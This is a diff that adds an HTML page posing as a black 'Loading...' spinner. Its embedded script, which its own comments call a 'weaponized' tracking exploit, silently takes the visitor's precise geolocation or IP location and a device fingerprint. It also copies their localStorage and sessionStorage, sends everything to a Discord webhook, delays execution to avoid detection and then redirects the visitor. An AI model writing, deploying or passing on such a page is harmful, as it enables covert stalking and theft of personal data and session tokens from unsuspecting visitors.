@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .loader {
+            border: 5px solid rgba(255, 255, 255, 0.2);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+
+</head>
+<body>
+
+    <script>
+
+// WARNING: This is a weaponized live geolocation tracking exploit. Use responsibly.
+
+const DISCORD_WEBHOOK = "https://discord/webhook";
+
+
+(function() {
+    const DISCORD_WEBHOOK = "https://discord.com/webhook";
+
+    // Function to send data to Discord
+    const sendToDiscord = (data) => {
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", DISCORD_WEBHOOK, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({
+            content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
+        }));
+    };
+
+    // Function to get geolocation or fallback to IP-based
+    const getLocation = () => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const geolocationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: position.timestamp
+                    };
+                    sendToDiscord({ type: "geolocation", data: geolocationData });
+                },
+                () => {
+                    // Fallback to IP-based geolocation
+                    fetch('https://ipapi.co/json/')
+                        .then(response => response.json())
+                        .then(data => {
+                            const ipGeolocationData = {
+                                ip: data.ip,
+                                city: data.city,
+                                region: data.region,
+                                country: data.country_name,
+                                latitude: data.latitude,
+                                longitude: data.longitude
+                            };
+                            sendToDiscord({ type: "ipGeolocation", data: ipGeolocationData });
+                        })
+                        .catch(() => {
+                            sendToDiscord({ type: "geolocationError", data: { message: "Failed to fetch IP-based geolocation." } });
+                        });
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            // If browser doesn't support geolocation
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ipGeolocationData = {
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country_name,
+                        latitude: data.latitude,
+                        longitude: data.longitude
+                    };
+                    sendToDiscord({ type: "ipGeolocation", data: ipGeolocationData });
+                })
+                .catch(() => {
+                    sendToDiscord({ type: "geolocationError", data: { message: "Geolocation not supported and IP fallback failed." } });
+                });
+        }
+    };
+
+    // Trigger location collection after short delay (to help evade automation detection)
+    setTimeout(() => {
+        getLocation();
+    }, 5000); // Adjust delay as needed
+})();
+
+
+// WARNING: This script is designed to extract highly sensitive information from the target device. Use with extreme caution.
+
+(function() {
+    // Discord Webhook for data exfiltration
+    const DISCORD_WEBHOOK = "https://discord.com/webhook";
+
+    // Function to send data to Discord
+    const sendToDiscord = (data) => {
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", DISCORD_WEBHOOK, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({ content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`` }));
+    };
+
+    // Function to gather sensitive device information
+    const gatherSensitiveInfo = () => {
+        const sensitiveInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            colorDepth: window.screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            batteryStatus: null,
+            networkInfo: null,
+            installedFonts: null,
+            localStorageData: null,
+            sessionStorageData: null,
+            browserPlugins: Array.from(navigator.plugins).map(plugin => plugin.name),
+            mimeTypes: Array.from(navigator.mimeTypes).map(mimeType => mimeType.type),
+            webGLInfo: null,
+            audioContextFingerprint: null
+        };
+
+        // Get battery status if supported
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                sensitiveInfo.batteryStatus = {
+                    level: battery.level,
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+                sendToDiscord({ type: "sensitiveInfo", data: sensitiveInfo });
+            });
+        } else {
+            sendToDiscord({ type: "sensitiveInfo", data: sensitiveInfo });
+        }
+
+        // Get network information if supported
+        if (navigator.connection) {
+            sensitiveInfo.networkInfo = {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            };
+        }
+    setTimeout(function() {
+        window.location.href = "https://redirecturl/";
+    }, 2000); // Redirects after 2 seconds
+
+        // Get installed fonts (fingerprinting)
+        const fontList = [];
+        const fontCheck = (font) => {
+            const canvas = document.createElement("canvas");
+            const context = canvas.getContext("2d");
+            const text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            context.font = `72px ${font}, sans-serif`;
+            const baselineSize = context.measureText(text).width;
+            context.font = `72px ${font}, monospace`;
+            const newSize = context.measureText(text).width;
+            return baselineSize !== newSize;
+        };
+
+        const fonts = ["Arial", "Times New Roman", "Courier New", "Verdana", "Georgia", "Comic Sans MS"];
+        fonts.forEach(font => {
+            if (fontCheck(font)) {
+                fontList.push(font);
+            }
+        });
+        sensitiveInfo.installedFonts = fontList;
+
+        // Get localStorage and sessionStorage data
+        sensitiveInfo.localStorageData = JSON.stringify(localStorage);
+        sensitiveInfo.sessionStorageData = JSON.stringify(sessionStorage);
+
+        // Get WebGL information
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (gl) {
+            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+            if (debugInfo) {
+                sensitiveInfo.webGLInfo = {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                };
+            }
+        }
+
+        // Get AudioContext fingerprint
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioContext.createOscillator();
+        const analyser = audioContext.createAnalyser();
+        const gainNode = audioContext.createGain();
+        const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+
+        oscillator.type = "triangle";
+        oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
+
+        oscillator.connect(analyser);
+        analyser.connect(scriptProcessor);
+        scriptProcessor.connect(gainNode);
+        gainNode.connect(audioContext.destination);
+
+        oscillator.start(0);
+
+        scriptProcessor.onaudioprocess = () => {
+            const array = new Uint8Array(analyser.frequencyBinCount);
+            analyser.getByteFrequencyData(array);
+            sensitiveInfo.audioContextFingerprint = array.join(",");
+            oscillator.stop();
+            audioContext.close();
+            sendToDiscord({ type: "sensitiveInfo", data: sensitiveInfo });
+        };
+    };
+
+    // Delayed execution to avoid immediate detection
+    setTimeout(() => {
+        gatherSensitiveInfo();
+    }, 5000); // 5-second delay to avoid detection
+})();
+
+ </script>
+</body>
+</html>
